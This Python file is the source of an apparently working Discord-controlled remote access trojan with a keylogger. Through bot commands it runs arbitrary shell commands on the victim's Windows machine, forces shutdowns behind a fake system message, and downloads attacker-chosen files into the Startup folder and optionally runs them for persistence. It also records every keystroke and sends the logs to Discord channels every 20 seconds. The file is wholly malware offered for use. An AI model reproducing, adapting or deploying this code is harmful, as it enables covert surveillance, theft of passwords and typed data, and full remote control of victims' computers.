import discord
import os
import sys
import requests
import keyboard
import asyncio

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)
COMPUTERNAME = os.getenv("COMPUTERNAME")
TOKEN = ""
keylogger_channel = 0
keylogger_channelTWO = 0
def bot():
    @client.event
    async def on_message(message):
        if message.author == client.user:
            return

        if message.content.startswith('$help'):
            embed = discord.Embed(title="Help", color=0x00ff00)
            embed.set_author(name=COMPUTERNAME)
            embed.add_field(name="$computers", value="Shows all computers connected!", inline=False)
            embed.add_field(name="$computers", value="Shows all computers connected!", inline=False)
            await message.channel.send(embed=embed)

        if message.content.startswith('$computers'):
            embed = discord.Embed(title=COMPUTERNAME,color=0x00ff00)
            await message.channel.send(embed=embed)

        if message.content.startswith('$cmd'):
            args = list(message.content.split())
            if len(args) >= 1:
                arg1 = args[0]
                print(arg1)
            else:
                arg1 = None
            if len(args) >= 2:
                arg2 = args[1]
                print(arg2)
            else:
                arg2 = None
            if len(args) >= 3:
                arg3 = " ".join(args[2:])
                print(arg3)
            else:
                arg3 = None
            

            if arg2  == str(COMPUTERNAME):
                if not arg3:
                    embed = discord.Embed(title="Please enter a command. Type: $commands", color=0x00ff00)
                    embed.set_author(name=COMPUTERNAME)
                    await message.channel.send(embed=embed)
                    print("--------")

                if arg3 == "exit":
                    embed = discord.Embed(title="Okay, exit!", color=0x00ff00)
                    embed.set_author(name=COMPUTERNAME)
                    await message.channel.send(embed=embed)
                    print("--------")
                    sys.exit()
                else:
                    embed = discord.Embed(color=0x00ff00)
                    embed.add_field(name="Command:", value=arg3, inline=False)
                    embed.set_author(name=COMPUTERNAME)
                    await message.channel.send(embed=embed)
                    print("--------")
                    
                    if arg3 == 'dir':
                        b = os.listdir()
                        print(b)
                    elif arg3[:2] == 'cd' and len(arg3) > 3:
                        cd, di = arg3.split(' ')
                        os.chdir(di) 
                        b = 'changed'
                        print(b)

                    try :
                        os.system(arg3)
                    except:
                        1
                    
            else:
                embed = discord.Embed(title="Please enter a correct computer name. Type: $computers", color=0x00ff00)
                embed.set_author(name=COMPUTERNAME)
                await message.channel.send(embed=embed)
                print("--------")
            if arg2 == "ALL-COMPUTERS":
                if not arg3:
                    embed = discord.Embed(title="Please enter a command. Type: $commands", color=0x00ff00)
                    embed.set_author(name=COMPUTERNAME)
                    await message.channel.send(embed=embed)
                    print("--------")

                if arg3 == "exit":
                    embed = discord.Embed(title="Okay, exit!", color=0x00ff00)
                    embed.set_author(name=COMPUTERNAME)
                    await message.channel.send(embed=embed)
                    print("--------")
                    sys.exit()
                else:
                    embed = discord.Embed(color=0x00ff00)
                    embed.add_field(name="Command:", value=arg3, inline=False)
                    embed.set_author(name=COMPUTERNAME)
                    await message.channel.send(embed=embed)
                    print("--------")
                    
                    if arg3 == 'dir':
                        b = os.listdir()
                        print(b)
                    elif arg3[:2] == 'cd' and len(arg3) > 3:
                        cd, di = arg3.split(' ')
                        os.chdir(di) 
                        b = 'changed'
                        print(b)

                    try :
                        os.system(arg3)
                    except:
                        1
        
        if message.content.startswith('!computers'):
            embed = discord.Embed(color=0x00ff00)
            embed.set_author(name=COMPUTERNAME)
            await message.channel.send(embed=embed)
            print("--------")

        if message.content.startswith('!shutdown'):
            embed = discord.Embed(title="SHUTDOWN!",color=0x00ff00)
            embed.set_author(name=COMPUTERNAME)
            await message.channel.send(embed=embed)
            print("--------")
            os.system("msg * System overloaded! Shutdown.")
            os.system('shutdown -s -t')

        if message.content.startswith('!download'):
            args = list(message.content.split())
            if len(args) >= 1:
                arg1 = args[0]
                print(arg1)
            else:
                arg1 = None
            if len(args) >= 2:
                arg2 = args[1]
                print(arg2)
            else:
                arg2 = None
            if len(args) >= 3:
                arg3 = args[2]
                print(arg3)
            else:
                arg3 = None
            if len(args) >= 4:
                arg4 = args[3]
                print(arg4)
            else:
                arg3 = None
        
            if arg2  == str(COMPUTERNAME):
                if arg3 == "opt:1":
                    if arg4 == None:
                        embed = discord.Embed(title="Please enter a url.", color=0x00ff00)
                        embed.set_author(name=COMPUTERNAME)
                        await message.channel.send(embed=embed)
                        print("--------")
                    else:
                        url = str(arg4)
                        response = requests.get(url)
                        filename = os.path.join(os.path.expanduser("~"), 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup', url.split("/")[-1])
                        open(filename, 'wb').write(response.content)
                        embed = discord.Embed(title="Okay, file downloaded into startup. Hope it worked:)", color=0x00ff00)
                        embed.set_author(name=COMPUTERNAME)
                        await message.channel.send(embed=embed)
                        print("--------")
                
                if arg3 == "opt:2":
                    if arg4 == None:
                        embed = discord.Embed(title="Please enter a url.", color=0x00ff00)
                        embed.set_author(name=COMPUTERNAME)
                        await message.channel.send(embed=embed)
                        print("--------")
                    else:
                        url = str(arg4)
                        response = requests.get(url)
                        filename = os.path.join(os.path.expanduser("~"), 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup', url.split("/")[-1])
                        open(filename, 'wb').write(response.content)
                        os.system("start " + os.path.join(os.path.expanduser("~"), 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup', url.split("/")[-1]))
                        print(filename)
                        embed = discord.Embed(title="Okay, file downloaded into startup and started. Hope it worked:)", color=0x00ff00)
                        embed.set_author(name=COMPUTERNAME)
                        await message.channel.send(embed=embed)
                        print("--------")
def keybot():
    @client.event
    async def on_ready():
        print('Logged in as')
        print(client.user.name)
        print(client.user.id)
        print('------')
        channel = client.get_channel(keylogger_channel) # Replace with the ID of the channel you want to send messages to
        channelTWO = client.get_channel(keylogger_channelTWO)
        print(channel)
        print(channelTWO)
        log = ""
        logPLUS = ""
        async def send_message():
            nonlocal log
            nonlocal logPLUS
            await channel.send(COMPUTERNAME + ": \n\n" + log)
            if len(logPLUS) > 999:
                logPLUS = ""
            await channelTWO.send(COMPUTERNAME + ": \n\n" + logPLUS)
            log = ""
            await asyncio.sleep(20)
        def on_press(key):
            nonlocal log
            nonlocal logPLUS
            if key.name == "backspace":
                log = log[:-1]
                logPLUS = logPLUS[:-1]
            elif key.name == "space":
                log += " "
                logPLUS += " "
            elif key.name == "umschalt":
                log += ""
                logPLUS += ""
            elif key.name == "enter":
                log += "\n"
                logPLUS += "\n"
            elif key.name == "shift":
                log += ""
                logPLUS += ""
            elif key.name == "right shift":
                log += ""
                logPLUS += ""
            elif key.name == "strg":
                log += ""
                logPLUS += ""
            elif key.name == "alt gr":
                log += ""
                logPLUS += ""
            elif key.name == "alt":
                log += ""
                logPLUS += ""
            elif key.name == "nach-rechts":
                log += ""
                logPLUS += ""
            elif key.name == "nach-links":
                log += ""
                logPLUS += ""
            elif key.name == "nach-oben":
                log += ""
                logPLUS += ""
            elif key.name == "nach-unten":
                log += ""
                logPLUS += ""
            elif key.name == "strgv":
                log += ""
                logPLUS += ""
            elif key.name == "strgc":
                log += ""
                logPLUS += ""
            elif key.name == "tab":
                log += "    "
                logPLUS += "    "
            elif key.name == "feststell":
                log += ""
                logPLUS += ""
            else:
                try:
                    log += key.name
                    logPLUS += key.name
                except AttributeError:
                    log += key
                    logPLUS += key
        keyboard.on_press(on_press)
        while True:
            await send_message()
bot()
keybot()
client.run(TOKEN)